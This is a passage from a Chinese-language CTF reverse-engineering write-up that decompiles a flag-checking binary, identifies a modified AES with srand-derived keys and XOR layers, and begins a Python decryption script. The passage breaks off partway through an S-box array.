</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Input your flag: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="p">{</span>   
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">random_bytes</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">random_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x180</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x110</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// [rbp-1C8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 16
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">len1</span> <span class="o">=</span> <span class="n">var_1C8</span><span class="p">;</span>  <span class="c1">// 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">len2</span> <span class="o">=</span> <span class="n">var_1C4</span><span class="p">;</span>  <span class="c1">// 0xA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xA</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">offset</span><span class="p">];</span>               
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8_t</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">dst</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">dst</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">dst</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">dst</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">tmp</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte_606020</span><span class="p">[</span><span class="n">tmp</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>       <span class="c1">// 用查表映射
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">            <span class="c1">// 异或混淆写回
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">^=</span> <span class="n">tmp</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>              <span class="c1">// 异或回原数组
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">var_1C0</span> <span class="o">-</span> <span class="n">var_1C8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8_t</span> <span class="n">src_byte</span> <span class="o">=</span> <span class="n">var_190</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8_t</span> <span class="n">xor_byte</span> <span class="o">=</span> <span class="n">var_184</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="n">var_190</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">src_byte</span> <span class="o">^</span> <span class="n">xor_byte</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">var_1BC</span><span class="o">++</span><span class="p">;</span>  <span class="c1">// 循环计数器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>手动把重复代码化简用数字表示重复次数，一点点扣慢慢能看出来是个AES加密，最开始两个sbox都异或完后发现互逆（其实并非完全互逆，坑死人了，sbox有两个数重复了，你去逆矩阵求出来的是错误的I_SBOX）</p>
<p>整体的加密流程是:先对通过一开始给出的32字节的额外key对Sbox和I_Sbox进行解密,读入32字节的输入后设置srand的seed为0x10000,</p>
<p>然后这个srand分两轮,第一轮生成16个rand()作为key参与AES的加密,第二轮用第17次rand出的int当作seed然后rand出32个xor key(最后调试解密脚本的时候也被这里坑了,本来应该是0x5011e654,写成了&amp;0xff后的0x54,看了半天才看出来,也是被坑惨了)</p>
<p>AES的实现是标准的,另外最后的密文是Congratulations!This is the correct flag!的前32字节,最后就是AES的加密结果xor上生成的xor key 然后再xor一开始给出的32字节key,然后去跟这个密文比较</p>
<p>对于随机数的逻辑生成一下,脚本如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">key</span><span class="p">[</span><span class="mi">17</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">17</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Key = &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;0x%02X,&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Rand32 = &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;0x%02X,&#34;</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到如下两组数据:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">Key = 0xF4,0x70,0xBB,0xC0,0x31,0xCA,0xEE,0x5E,0x58,0xB2,0x72,0xEA,0x02,0xF3,0xFF,0xE6,
</span></span><span class="line"><span class="cl">Rand32 = 0xF8,0x44,0xC6,0xBA,0xB1,0xE5,0x0E,0x3B,0xA2,0x4B,0xB5,0xAA,0x4A,0x89,0xC7,0xA0,0x19,0xBD,0xEC,0x5E,0xDE,0xC1,0xC3,0x87,0x75,0xE6,0x12,0x71,0x61,0xEA,0xF4,0x59,
</span></span></code></pre></td></tr></table>
</div>
</div><p>梳理清楚了加密逻辑,打印出了随机数,那么可以写出解密脚本如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">bytes_array</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x30</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">AES</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">MIX_C</span>  <span class="o">=</span> <span class="p">[[</span><span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">],</span> <span class="p">[</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">],</span> <span class="p">[</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">],</span> <span class="p">[</span><span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="n">I_MIXC</span> <span class="o">=</span> <span class="p">[[</span><span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">],</span> <span class="p">[</span><span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">],</span> <span class="p">[</span><span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">],</span> <span class="p">[</span><span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="n">RCon</span>   <span class="o">=</span> <span class="p">[</span><span class="mh">0x01000000</span><span class="p">,</span> <span class="mh">0x02000000</span><span class="p">,</span> <span class="mh">0x04000000</span><span class="p">,</span> <span class="mh">0x08000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">,</span> <span class="mh">0x20000000</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x80000000</span><span class="p">,</span> <span class="mh">0x1B000000</span><span class="p">,</span> <span class="mh">0x36000000</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">S_BOX</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x31</span><span 